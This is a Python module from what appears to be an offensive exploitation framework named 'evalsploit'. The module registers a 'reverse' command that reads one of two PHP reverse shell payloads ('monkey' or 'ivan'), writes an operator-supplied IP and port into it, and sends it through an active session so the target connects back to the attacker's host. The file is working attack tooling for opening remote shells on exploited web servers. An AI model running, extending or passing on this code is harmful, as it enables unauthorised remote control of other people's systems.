"""reverse: reverse shell (monkey / ivan)."""

from __future__ import annotations

from pathlib import Path
from typing import TYPE_CHECKING, Optional

from evalsploit.config import project_root
from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

if TYPE_CHECKING:
    from evalsploit.context import SessionContext


REVERSE_FILES = {
    "monkey": "reverse.php",
    "ivan": "reverse2.php",
}

@register("reverse", description="Start reverse shell (type: set reverse ivan|monkey)", usage="reverse <IP:PORT>")
class ReverseModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        if not args.strip():
            print("Usage: reverse IP:PORT")
            return None
        parts = args.strip().split(":", 1)
        ip = parts[0].strip()
        try:
            port = int(parts[1].strip())
        except (IndexError, ValueError):
            print("Need IP:PORT")
            return None
        rtype = getattr(ctx.config, "reverse_type", "ivan") or "ivan"
        filename = REVERSE_FILES.get(rtype, "reverse2.php")
        path = project_root() / "exploits" / "reverse" / filename
        if not path.exists():
            print(f"{filename} not found")
            return None
        data = path.read_text(encoding="utf-8", errors="replace")
        if rtype == "monkey":
            data = data.replace("$ip = 'IP';", f"$ip = '{ip}';")
            data = data.replace("$port = PORT;", f"$port = {port};")
        else:
            data = data.replace("$sh = new Sh(__IP__, __PORT__);", f"$sh = new Sh('{ip}', {port});")
        print(f"Starting reverse ({rtype}: {filename})...")
        out = ctx.send(data, timeout=None)
        if out:
            print(out)
        return None
